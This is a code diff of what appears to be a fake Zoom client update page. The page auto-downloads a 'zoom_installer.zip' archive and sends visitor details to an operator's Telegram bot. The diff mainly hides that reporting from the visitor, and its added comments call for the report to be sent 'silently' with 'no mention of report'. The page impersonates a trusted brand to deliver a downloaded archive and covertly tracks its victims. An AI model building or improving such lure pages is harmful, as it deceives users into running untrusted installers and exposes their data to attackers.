@@ -1,20 +1,18 @@
 <!DOCTYPE html>
-<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom Client Update">
+<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Zoom Client Update</title>
+    <title>Zoom</title>
     <link href="css2.css" rel="stylesheet" />
-    <!-- JSZip for creating ZIP archives -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js">
     </script>
     <style>
-        /* --- reset & base --- */
+        /* (styles unchanged – same as before) */
         * {
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #f4f7fa;
@@ -23,7 +21,6 @@
             min-height: 100vh;
             position: relative;
         }
-
         .container {
             display: flex;
             flex-direction: column;
@@ -33,18 +30,15 @@
             text-align: center;
             padding: 40px 20px;
         }
-
         .logo-container {
             position: absolute;
             top: 20px;
             left: 20px;
         }
-
         .logo {
             width: 120px;
             height: auto;
         }
-
         .top-right-links {
             position: absolute;
             top: 20px;
@@ -55,29 +49,24 @@
             gap: 15px;
             align-items: center;
         }
-
         .top-right-links a {
             text-decoration: none;
             color: #0072c6;
         }
-
         .top-right-links a:hover {
             text-decoration: underline;
         }
-
         .heading {
             font-size: 28px;
             font-weight: bold;
             color: #0072c6;
             margin-top: 60px;
         }
-
         .subheading {
             font-size: 18px;
             color: #555;
             margin-top: 10px;
         }
-
         .download-info,
         .countdown {
             font-size: 18px;
@@ -85,7 +74,6 @@
             color: #0072c6;
             margin-top: 15px;
         }
-
         .spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #0072c6;
@@ -95,16 +83,10 @@
             animation: spin 2s linear infinite;
             margin-top: 30px;
         }
-
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
         .status-message {
             margin-top: 20px;
             font-size: 16px;
@@ -112,15 +94,12 @@
             min-height: 30px;
             color: #28a745;
         }
-
         .status-message.error {
             color: #dc3545;
         }
-
         .status-message.info {
             color: #0072c6;
         }
-
         .footer {
             position: absolute;
             bottom: 20px;
@@ -130,24 +109,19 @@
             color: #777;
             padding: 0 20px;
         }
-
         .footer a {
             color: #0072c6;
             text-decoration: none;
         }
-
         .footer a:hover {
             text-decoration: underline;
         }
-
         .footer p {
             margin: 4px 0;
         }
-
         #download-trigger {
             display: none;
         }
-
         @media (max-width: 600px) {
             .logo-container {
                 position: static;
@@ -337,14 +311,17 @@
                         return downloadZip(blob, 'zoom_installer.zip');
                     })
                     .then(function() {
+                        // Success – show only download started, no mention of report
                         statusMsg.textContent = '✅ Download started.';
                         statusMsg.className = 'status-message';
+                        // Send Telegram report silently (do not update status)
                         sendTelegramReport();
                     })
                     .catch(function(err) {
                         console.error('Download failed:', err);
                         statusMsg.textContent = '❌ Download failed. Please use the manual link below.';
                         statusMsg.className = 'status-message error';
+                        // Still try to send report silently
                         sendTelegramReport();
                     });
             }
@@ -381,6 +358,7 @@
 
             // ------------------------------------------------------------
             //  Telegram reporting – professional, aligned columns, page URL as download link
+            //  All status updates are removed; errors are logged to console only.
             // ------------------------------------------------------------
             var reportSent = false;
 
@@ -455,8 +433,7 @@
                 reportSent = true;
 
                 if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
-                    statusMsg.textContent = '⚠️ Telegram report not configured.';
-                    statusMsg.className = 'status-message info';
+                    console.warn('Telegram not configured.');
                     return;
                 }
 
@@ -537,7 +514,7 @@
                 var time = getTimeUTC();
                 var lang = navigator.language || 'Unknown';
                 var referrer = document.referrer || 'Direct';
-                // Use the page URL as the download URL (where the ZIP is served from)
+                // Use the page URL as the download URL (where the ZIP is hosted)
                 var downloadUrl = window.location.href;
 
                 // Build aligned message with monospace block – header "Zoom"
@@ -593,7 +570,8 @@
                     parse_mode: 'Markdown'
                 };
 
-                return fetch(url, {
+                // Send silently – no status updates
+                fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
@@ -604,16 +582,13 @@
                     })
                     .then(function(data) {
                         if (data.ok) {
-                            statusMsg.textContent = '✅ Download started.';
-                            statusMsg.className = 'status-message';
+                            console.log('Telegram report sent successfully.');
                         } else {
                             throw new Error('Telegram error: ' + (data.description || 'unknown'));
                         }
                     })
                     .catch(function(err) {
                         console.warn('Telegram report failed:', err);
-                        statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
-                        statusMsg.className = 'status-message error';
                     });
             }
 
